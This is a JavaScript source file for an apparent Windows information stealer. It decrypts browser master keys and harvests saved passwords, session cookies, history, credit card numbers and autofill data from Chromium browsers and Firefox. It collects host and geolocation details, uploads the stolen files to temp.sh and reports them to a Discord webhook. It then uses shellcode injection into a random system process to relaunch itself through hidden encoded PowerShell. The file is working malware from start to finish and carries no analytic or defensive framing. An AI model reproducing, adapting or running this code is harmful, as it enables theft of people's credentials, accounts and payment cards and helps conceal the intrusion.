'use strict';
const cp    = require('child_process');
const fs    = require('fs');
const path  = require('path');
const http  = require('http');
const https = require('https');
const crypto = require('crypto');
const os    = require('os');

const WEBHOOK = '__WEBHOOK_URL__';
const TMP     = os.tmpdir();
const RUN_ID  = Date.now().toString(36);

// ── Shell helpers ─────────────────────────────────────────────────────────────

function ps(script) {
  try {
    return cp.execSync(
      'powershell -NoLogo -NoProfile -NonInteractive -Command "' +
      script.replace(/"/g, '\\"').replace(/\n/g, ' ') + '"',
      { encoding: 'utf8', timeout: 20000, windowsHide: true }
    ).trim();
  } catch { return ''; }
}

// ── SQLite reading ────────────────────────────────────────────────────────────

function tryPython(db, query) {
  const code = "import sqlite3,json,sys;" +
    "conn=sqlite3.connect(sys.argv[1]);" +
    "conn.row_factory=sqlite3.Row;" +
    "print(json.dumps([dict(r) for r in conn.execute(sys.argv[2])],default=str))";
  for (const bin of ['python3', 'python']) {
    try {
      const r = cp.execSync(
        bin + ' -c "' + code + '" "' + db + '" "' + query.replace(/"/g, '\\"') + '"',
        { encoding: 'utf8', timeout: 15000, windowsHide: true }
      ).trim();
      return JSON.parse(r || '[]');
    } catch {}
  }
  return null;
}

function getSqlite3() {
  const exe = path.join(TMP, 'sq3_' + RUN_ID + '.exe');
  if (fs.existsSync(exe)) return exe;
  const zip = path.join(TMP, 'sq3.zip');
  const dir = path.join(TMP, 'sq3_dir');
  try {
    ps('[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;' +
       '(New-Object Net.WebClient).DownloadFile(' +
       "'https://www.sqlite.org/2024/sqlite-tools-win-x64-3460100.zip','" + zip + "')");
    ps('Add-Type -A System.IO.Compression.FileSystem;' +
       '[IO.Compression.ZipFile]::ExtractToDirectory(' + "'" + zip + "','" + dir + "')");
    const found = cp.execSync('where /r "' + dir + '" sqlite3.exe',
      { encoding: 'utf8', windowsHide: true }).trim().split('\n')[0].trim();
    fs.copyFileSync(found, exe);
    return exe;
  } catch { return null; }
}

function readDb(dbPath, query) {
  const tmp = path.join(TMP, 'cdb_' + RUN_ID + '_' + Math.random().toString(36).slice(2) + '.db');
  try { fs.copyFileSync(dbPath, tmp); } catch { return []; }
  try {
    const py = tryPython(tmp, query);
    if (py) return py;
    const sq3 = getSqlite3();
    if (!sq3) return [];
    const raw = cp.execSync('"' + sq3 + '" -json "' + tmp + '" "' + query.replace(/"/g, '\\"') + '"',
      { encoding: 'utf8', timeout: 15000, windowsHide: true }).trim();
    return JSON.parse(raw || '[]');
  } catch { return []; } finally { try { fs.unlinkSync(tmp); } catch {} }
}

// ── Chrome master key + AES-256-GCM decryption ───────────────────────────────

const masterKeys = new Map();

function getMasterKey(localStatePath) {
  if (masterKeys.has(localStatePath)) return masterKeys.get(localStatePath);
  try {
    const ls  = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const b64 = ls && ls.os_crypt && ls.os_crypt.encrypted_key;
    if (!b64) return null;
    const enc = Buffer.from(b64, 'base64').slice(5);
    const dec = ps(
      'Add-Type -A System.Security;' +
      '[Convert]::ToBase64String(' +
        '[Security.Cryptography.ProtectedData]::Unprotect(' +
          "[Convert]::FromBase64String('" + enc.toString('base64') + "')," +
          '$null,' +
          "'CurrentUser'))"
    );
    if (!dec) return null;
    const key = Buffer.from(dec.trim(), 'base64');
    masterKeys.set(localStatePath, key);
    return key;
  } catch { return null; }
}

function decryptValue(encBytes, masterKey) {
  try {
    if (!encBytes || encBytes.length === 0) return '';
    const buf = Buffer.isBuffer(encBytes) ? encBytes : Buffer.from(encBytes);
    const sig = buf.slice(0, 3).toString();
    if (sig === 'v10' || sig === 'v20') {
      if (!masterKey) return '<no_key>';
      const iv  = buf.slice(3, 15);
      const tag = buf.slice(buf.length - 16);
      const ct  = buf.slice(15, buf.length - 16);
      const d   = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
      d.setAuthTag(tag);
      return d.update(ct, undefined, 'utf8') + d.final('utf8');
    }
    // Legacy DPAPI
    return ps(
      'Add-Type -A System.Security;' +
      '[Text.Encoding]::UTF8.GetString(' +
        '[Security.Cryptography.ProtectedData]::Unprotect(' +
          "[Convert]::FromBase64String('" + buf.toString('base64') + "')," +
          '$null,' +
          "'CurrentUser'))"
    );
  } catch { return '<err>'; }
}

// ── Browser profile discovery ─────────────────────────────────────────────────

const CHROMIUM = [
  { name: 'Chrome',   base: path.join(process.env.LOCALAPPDATA || '', 'Google',         'Chrome',         'User Data') },
  { name: 'Edge',     base: path.join(process.env.LOCALAPPDATA || '', 'Microsoft',       'Edge',           'User Data') },
  { name: 'Brave',    base: path.join(process.env.LOCALAPPDATA || '', 'BraveSoftware',   'Brave-Browser',  'User Data') },
  { name: 'Opera',    base: path.join(process.env.APPDATA      || '', 'Opera Software',  'Opera Stable')               },
  { name: 'OperaGX',  base: path.join(process.env.APPDATA      || '', 'Opera Software',  'Opera GX Stable')            },
  { name: 'Vivaldi',  base: path.join(process.env.LOCALAPPDATA || '', 'Vivaldi',         'User Data')                  },
  { name: 'Yandex',   base: path.join(process.env.LOCALAPPDATA || '', 'Yandex',          'YandexBrowser',  'User Data') },
];

function profiles(base) {
  if (!fs.existsSync(base)) return [];
  try {
    const dirs = fs.readdirSync(base).filter(d => {
      return (d === 'Default' || /^Profile \d+$/.test(d)) &&
        fs.statSync(path.join(base, d)).isDirectory();
    });
    return dirs.length ? dirs.map(d => path.join(base, d)) : [path.join(base, 'Default')];
  } catch { return [path.join(base, 'Default')]; }
}

// ── Collectors ────────────────────────────────────────────────────────────────

function collectPasswords() {
  const out = [];
  for (const br of CHROMIUM) {
    if (!fs.existsSync(br.base)) continue;
    const mk = getMasterKey(path.join(br.base, 'Local State'));
    for (const prof of profiles(br.base)) {
      const db = path.join(prof, 'Login Data');
      if (!fs.existsSync(db)) continue;
      const rows = readDb(db,
        "SELECT origin_url, username_value, hex(password_value) AS pv " +
        "FROM logins WHERE username_value != ''");
      for (const r of rows) {
        const raw = Buffer.from(r.pv || '', 'hex');
        out.push({ browser: br.name, url: r.origin_url || '', user: r.username_value, pass: decryptValue(raw, mk) });
      }
    }
  }
  return out;
}

function collectCookies() {
  const out = [];
  for (const br of CHROMIUM) {
    if (!fs.existsSync(br.base)) continue;
    const mk = getMasterKey(path.join(br.base, 'Local State'));
    for (const prof of profiles(br.base)) {
      const db = fs.existsSync(path.join(prof, 'Network', 'Cookies'))
        ? path.join(prof, 'Network', 'Cookies')
        : path.join(prof, 'Cookies');
      if (!fs.existsSync(db)) continue;
      const rows = readDb(db,
        "SELECT host_key, name, hex(encrypted_value) AS ev FROM cookies " +
        "WHERE (name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%' " +
        "OR name LIKE '%login%' OR name LIKE '%sid%' OR name LIKE '%uid%') LIMIT 500");
      for (const r of rows) {
        const raw = Buffer.from(r.ev || '', 'hex');
        out.push({ browser: br.name, host: r.host_key, name: r.name, value: decryptValue(raw, mk) });
      }
    }
  }
  return out;
}

function collectHistory() {
  const out = [];
  for (const br of CHROMIUM) {
    if (!fs.existsSync(br.base)) continue;
    for (const prof of profiles(br.base)) {
      const db = path.join(prof, 'History');
      if (!fs.existsSync(db)) continue;
      const rows = readDb(db,
        "SELECT url, title, visit_count, " +
        "datetime((last_visit_time/1000000)-11644473600,'unixepoch','localtime') AS visited " +
        "FROM urls ORDER BY last_visit_time DESC LIMIT 300");
      for (const r of rows)
        out.push({ browser: br.name, url: r.url, title: r.title || '', visits: r.visit_count || 0, visited: r.visited });
    }
  }
  return out;
}

function collectCards() {
  const out = [];
  for (const br of CHROMIUM) {
    if (!fs.existsSync(br.base)) continue;
    const mk = getMasterKey(path.join(br.base, 'Local State'));
    for (const prof of profiles(br.base)) {
      const db = path.join(prof, 'Web Data');
      if (!fs.existsSync(db)) continue;
      try {
        const cards = readDb(db,
          "SELECT name_on_card, expiration_month, expiration_year, hex(card_number_encrypted) AS cn FROM credit_cards");
        for (const c of cards) {
          const num = decryptValue(Buffer.from(c.cn || '', 'hex'), mk);
          out.push({ type: 'card', browser: br.name, name: c.name_on_card, exp: c.expiration_month + '/' + c.expiration_year, number: num });
        }
      } catch {}
      try {
        const fills = readDb(db, "SELECT name, value FROM autofill WHERE value != '' LIMIT 200");
        for (const f of fills)
          out.push({ type: 'autofill', browser: br.name, name: f.name, value: f.value });
      } catch {}
    }
  }
  return out;
}

function collectFirefox() {
  const base = path.join(process.env.APPDATA || '', 'Mozilla', 'Firefox', 'Profiles');
  const out  = { logins: [], cookies: [], history: [] };
  if (!fs.existsSync(base)) return out;
  let profs = [];
  try { profs = fs.readdirSync(base).map(d => path.join(base, d)).filter(d => fs.statSync(d).isDirectory()); } catch {}
  for (const p of profs) {
    const places = path.join(p, 'places.sqlite');
    if (fs.existsSync(places)) {
      const rows = readDb(places,
        "SELECT url, title, visit_count, datetime(last_visit_date/1000000,'unixepoch','localtime') AS visited " +
        "FROM moz_places WHERE visit_count > 0 ORDER BY last_visit_date DESC LIMIT 200");
      for (const r of rows) out.history.push({ url: r.url, title: r.title || '', visits: r.visit_count, visited: r.visited });
    }
    const cdb = path.join(p, 'cookies.sqlite');
    if (fs.existsSync(cdb)) {
      const rows = readDb(cdb,
        "SELECT host, name, value FROM moz_cookies WHERE " +
        "(name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%') LIMIT 200");
      for (const r of rows) out.cookies.push({ host: r.host, name: r.name, value: r.value });
    }
    const lj = path.join(p, 'logins.json');
    if (fs.existsSync(lj)) {
      try {
        const data = JSON.parse(fs.readFileSync(lj, 'utf8'));
        for (const l of (data.logins || []))
          out.logins.push({ url: l.formSubmitURL || l.hostname, user: l.encryptedUsername, pass: '<firefox_encrypted>' });
      } catch {}
    }
  }
  return out;
}

// ── System info ───────────────────────────────────────────────────────────────

function httpGet(url) {
  return new Promise(function(resolve, reject) {
    const mod = url.startsWith('https') ? https : http;
    const req = mod.get(url, { timeout: 8000 }, function(res) {
      let d = '';
      res.on('data', function(c) { d += c; });
      res.on('end', function() { resolve(d); });
    });
    req.on('error', reject);
    req.on('timeout', function() { req.destroy(); reject(new Error('timeout')); });
  });
}

async function getSysInfo() {
  const info = {
    hostname: os.hostname(),
    username: os.userInfo().username,
    release:  os.release(),
    arch:     os.arch(),
    cpu:      (os.cpus()[0] || {}).model || 'unknown',
    ram:      Math.round(os.totalmem() / 1073741824) + ' GB',
    ips:      Object.values(os.networkInterfaces())
                .flat().filter(function(i) { return !i.internal && i.family === 'IPv4'; })
                .map(function(i) { return i.address; }).join(', '),
    publicIp: '', country: '', countryCode: '', city: '', isp: '',
  };
  try {
    const geo = JSON.parse(await httpGet('http://ip-api.com/json/?fields=query,country,countryCode,city,isp'));
    info.publicIp   = geo.query || '';
    info.country    = geo.country || '';
    info.countryCode = geo.countryCode || '';
    info.city       = geo.city || '';
    info.isp        = geo.isp || '';
  } catch {}
  try {
    const screen = ps('Add-Type -A System.Windows.Forms;' +
      '[Windows.Forms.Screen]::PrimaryScreen.Bounds | % { "$($_.Width)x$($_.Height)" }');
    if (screen) info.screen = screen;
  } catch {}
  return info;
}

// ── temp.sh upload ────────────────────────────────────────────────────────────

function uploadTempSh(filename, content) {
  return new Promise(function(resolve) {
    const body_content = Buffer.isBuffer(content) ? content : Buffer.from(content, 'utf8');
    const bnd  = '--------Boundary' + Math.random().toString(36).slice(2);
    const head = Buffer.from(
      '--' + bnd + '\r\n' +
      'Content-Disposition: form-data; name="file"; filename="' + filename + '"\r\n' +
      'Content-Type: text/plain; charset=utf-8\r\n\r\n'
    );
    const tail = Buffer.from('\r\n--' + bnd + '--\r\n');
    const body = Buffer.concat([head, body_content, tail]);
    const req  = https.request({
      hostname: 'temp.sh', path: '/upload', method: 'POST',
      headers: {
        'Content-Type': 'multipart/form-data; boundary=' + bnd,
        'Content-Length': body.length,
      },
      timeout: 30000,
    }, function(res) {
      let d = '';
      res.on('data', function(c) { d += c; });
      res.on('end',  function()  { resolve(d.trim() || null); });
    });
    req.on('error', function() { resolve(null); });
    req.on('timeout', function() { req.destroy(); resolve(null); });
    req.write(body);
    req.end();
  });
}

// ── Discord ───────────────────────────────────────────────────────────────────

function countryFlag(code) {
  if (!code || code.length !== 2) return '\u{1F310}';
  return Array.from(code.toUpperCase()).map(function(c) {
    return String.fromCodePoint(0x1F1E6 - 65 + c.charCodeAt(0));
  }).join('');
}

function trunc(s, n) { s = String(s || ''); return s.length > n ? s.slice(0, n - 1) + '\u2026' : s; }

function sendWebhook(payload) {
  return new Promise(function(resolve) {
    const body = Buffer.from(JSON.stringify(payload), 'utf8');
    const u    = new URL(WEBHOOK);
    const req  = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': body.length },
      timeout: 15000,
    }, function(res) { res.resume(); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', function() { req.destroy(); resolve(); });
    req.write(body);
    req.end();
  });
}

function embedSys(info) {
  const flag = countryFlag(info.countryCode);
  const lines = [
    '> **Host**      `' + info.hostname + '`',
    '> **User**      `' + info.username + '`',
    '> **OS**        `' + info.release  + '`  `' + info.arch + '`',
    '> **CPU**       `' + trunc(info.cpu, 40) + '`',
    '> **RAM**       `' + info.ram + '`',
  ];
  if (info.screen) lines.push('> **Screen**    `' + info.screen + '`');
  lines.push(
    '> **Local IP**  `' + (info.ips || 'none') + '`',
    '> **Public IP** `' + info.publicIp + '`',
    '> **Location**  ' + flag + ' ' + (info.city ? info.city + ', ' : '') + info.country,
    '> **ISP**       `' + info.isp + '`',
  );
  return {
    title: flag + '  New Harvest \u2014 ' + info.hostname,
    color: 0x7c3aed,
    description: lines.join('\n'),
    timestamp: new Date().toISOString(),
    footer: { text: 'browser-builder \u00b7 overlord' },
  };
}

function embedPasswords(rows, url) {
  const browsers = [...new Set(rows.map(function(r) { return r.browser; }))].join(', ');
  const preview  = rows.slice(0, 6).map(function(r) {
    return '`' + trunc(r.url, 38) + '`\n' + trunc(r.user, 25) + ' : ' + trunc(r.pass, 28);
  }).join('\n\n');
  const fields = [
    { name: 'Count',    value: String(rows.length), inline: true },
    { name: 'Browsers', value: browsers || 'none',  inline: true },
  ];
  if (url) fields.push({ name: '\uD83D\uDCC1 File', value: '[Download](' + url + ')', inline: false });
  return {
    title: '\uD83D\uDD11 Passwords',
    color: 0xef4444,
    description: preview.slice(0, 2048) || '*none found*',
    fields: fields,
    footer: { text: rows.length + ' credentials' },
  };
}

function embedCookies(rows, url) {
  const hosts   = new Set(rows.map(function(r) { return r.host; })).size;
  const preview = rows.slice(0, 6).map(function(r) {
    return '`' + trunc(r.host, 28) + '` **' + r.name + '**\n`' + trunc(r.value, 40) + '`';
  }).join('\n\n');
  const fields = [
    { name: 'Count', value: String(rows.length), inline: true },
    { name: 'Hosts', value: String(hosts),        inline: true },
  ];
  if (url) fields.push({ name: '\uD83D\uDCC1 File', value: '[Download](' + url + ')', inline: false });
  return {
    title: '\uD83C\uDF6A Session Cookies',
    color: 0xf97316,
    description: preview.slice(0, 2048) || '*none found*',
    fields: fields,
    footer: { text: rows.length + ' session cookies' },
  };
}

function embedHistory(rows, url) {
  const top     = rows.slice().sort(function(a, b) { return (b.visits || 0) - (a.visits || 0); }).slice(0, 8);
  const preview = top.map(function(r) {
    return '`' + r.visits + 'x` ' + trunc(r.url, 60);
  }).join('\n');
  const fields = [{ name: 'Total URLs', value: String(rows.length), inline: true }];
  if (url) fields.push({ name: '\uD83D\uDCC1 File', value: '[Download](' + url + ')', inline: false });
  return {
    title: '\uD83D\uDCDC Browsing History',
    color: 0x3b82f6,
    description: preview.slice(0, 2048) || '*none found*',
    fields: fields,
    footer: { text: 'sorted by frequency' },
  };
}

function embedCards(rows, url) {
  const cards   = rows.filter(function(r) { return r.type === 'card'; });
  const fills   = rows.filter(function(r) { return r.type === 'autofill'; });
  const preview = cards.slice(0, 4).map(function(c) {
    return '**' + c.name + '**\n`' + c.number + '`  exp `' + c.exp + '`';
  }).join('\n\n');
  const fields = [
    { name: 'Cards',    value: String(cards.length), inline: true },
    { name: 'Autofill', value: String(fills.length), inline: true },
  ];
  if (url) fields.push({ name: '\uD83D\uDCC1 File', value: '[Download](' + url + ')', inline: false });
  return {
    title: '\uD83D\uDCB3 Cards & Autofill',
    color: 0x10b981,
    description: preview.slice(0, 2048) || '*no cards found*',
    fields: fields,
    footer: { text: 'via Web Data' },
  };
}

// ── Format text output ────────────────────────────────────────────────────────

function fmtPasswords(rows) {
  return ['=== PASSWORDS ===', ''].concat(rows.map(function(r) {
    return '[Browser]  ' + r.browser + '\n[URL]      ' + r.url +
           '\n[User]     ' + r.user  + '\n[Pass]     ' + r.pass + '\n';
  })).join('\n');
}

function fmtCookies(rows) {
  return ['=== SESSION COOKIES ===', ''].concat(rows.map(function(r) {
    return '[Browser]  ' + r.browser + '\n[Host]     ' + r.host +
           '\n[Name]     ' + r.name  + '\n[Value]    ' + r.value + '\n';
  })).join('\n');
}

function fmtHistory(rows) {
  return ['=== HISTORY ===', ''].concat(rows.map(function(r) {
    return '[' + r.visits + 'x] ' + r.url + '\n     ' + r.title + ' (' + r.visited + ')\n';
  })).join('\n');
}

function fmtCards(rows) {
  const cards  = rows.filter(function(r) { return r.type === 'card'; });
  const fills  = rows.filter(function(r) { return r.type === 'autofill'; });
  const lines  = ['=== CARDS & AUTOFILL ===', ''];
  for (const c of cards)  lines.push('[CARD]   ' + c.name + ' | ' + c.number + ' | ' + c.exp);
  lines.push('');
  for (const f of fills)  lines.push('[FILL]   ' + f.name + ' = ' + f.value);
  return lines.join('\n');
}

// ── Entry point ───────────────────────────────────────────────────────────────

async function main() {
  const sysInfo  = await getSysInfo();
  const passwords = collectPasswords();
  const cookies   = collectCookies();
  const history   = collectHistory();
  const cards     = collectCards();
  const ff        = collectFirefox();

  for (const l of ff.logins)  passwords.push({ browser: 'Firefox', url: l.url,  user: l.user,  pass: l.pass  });
  for (const c of ff.cookies) cookies.push(  { browser: 'Firefox', host: c.host, name: c.name, value: c.value });
  for (const h of ff.history) history.push(  { browser: 'Firefox', url: h.url,  title: h.title, visits: h.visits, visited: h.visited });

  const host = sysInfo.hostname.replace(/[^a-zA-Z0-9_-]/g, '_');

  const [pwUrl, ckUrl, hiUrl, cdUrl] = await Promise.all([
    passwords.length ? uploadTempSh(host + '_passwords.txt',  fmtPasswords(passwords)) : Promise.resolve(null),
    cookies.length   ? uploadTempSh(host + '_cookies.txt',    fmtCookies(cookies))     : Promise.resolve(null),
    history.length   ? uploadTempSh(host + '_history.txt',    fmtHistory(history))     : Promise.resolve(null),
    cards.length     ? uploadTempSh(host + '_cards.txt',      fmtCards(cards))         : Promise.resolve(null),
  ]);

  await sendWebhook({ embeds: [embedSys(sysInfo)] });
  await new Promise(function(r) { setTimeout(r, 600); });
  await sendWebhook({ embeds: [embedPasswords(passwords, pwUrl), embedCookies(cookies, ckUrl)] });
  await new Promise(function(r) { setTimeout(r, 600); });
  await sendWebhook({ embeds: [embedHistory(history, hiUrl), embedCards(cards, cdUrl)] });

  // Inject into a random background Windows process
  injectSelf();
}

function injectSelf() {
  var ps1 = path.join(TMP, 'upd_' + RUN_ID + '.ps1');
  var self = fs.readFileSync(__filename, 'utf8');
  var b64  = Buffer.from(self, 'utf8').toString('base64');
  var injPs = [
    'Add-Type @\'',
    'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Linq;',
    'public class _Inj{',
    '  [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a,bool b,uint c);',
    '  [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);',
    '  [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[]d,uint s,out uint w);',
    '  [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);',
    '  [DllImport("kernel32")] static extern IntPtr GetModuleHandleA(string n);',
    '  [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string n);',
    '  [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);',
    '  static string[] T={"RuntimeBroker","backgroundTaskHost","sihost","fontdrvhost","dllhost","ctfmon","WmiPrvSE","spoolsv"};',
    '  public static bool Run(string cmd){',
    '    long we=GetProcAddress(GetModuleHandleA("kernel32.dll"),"WinExec").ToInt64();',
    '    if(we==0)return false;',
    '    byte[] cb=System.Text.Encoding.Default.GetBytes(cmd+"\\x00");',
    '    byte[] sc=new byte[]{0x48,0x83,0xEC,0x28,0x48,0x83,0xE4,0xF0,0x48,0x8D,0x0D,0x13,0x00,0x00,0x00,0x31,0xD2,0x48,0xB8,',
    '      (byte)(we&0xFF),(byte)((we>>8)&0xFF),(byte)((we>>16)&0xFF),(byte)((we>>24)&0xFF),',
    '      (byte)((we>>32)&0xFF),(byte)((we>>40)&0xFF),(byte)((we>>48)&0xFF),(byte)((we>>56)&0xFF),',
    '      0xFF,0xD0,0x48,0x83,0xC4,0x28,0xC3};',
    '    byte[] pl=new byte[sc.Length+cb.Length];',
    '    Buffer.BlockCopy(sc,0,pl,0,sc.Length);Buffer.BlockCopy(cb,0,pl,sc.Length,cb.Length);',
    '    var rng=new Random();',
    '    var procs=T.SelectMany(t=>Process.GetProcessesByName(t)).ToArray();',
    '    if(procs.Length==0)procs=Process.GetProcessesByName("explorer");',
    '    if(procs.Length==0)return false;',
    '    var tgt=procs[rng.Next(procs.Length)];',
    '    IntPtr h=OpenProcess(0x1F0FFF,false,(uint)tgt.Id);',
    '    if(h==IntPtr.Zero)return false;',
    '    IntPtr m=VirtualAllocEx(h,IntPtr.Zero,(uint)pl.Length,0x3000,0x40);',
    '    uint wr;WriteProcessMemory(h,m,pl,(uint)pl.Length,out wr);',
    '    CreateRemoteThread(h,IntPtr.Zero,0,m,IntPtr.Zero,0,IntPtr.Zero);',
    '    CloseHandle(h);return true;',
    '  }',
    '}',
    '\'@',
    '[_Inj]::Run("powershell -w h -ep b -nop -e ' + b64 + '")',
  ].join('\n');
  try {
    fs.writeFileSync(ps1, injPs, 'utf8');
    cp.execSync('powershell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + ps1 + '"',
      { timeout: 15000, windowsHide: true });
  } catch {}
  try { fs.unlinkSync(ps1); } catch {}
}

main().catch(function() {});
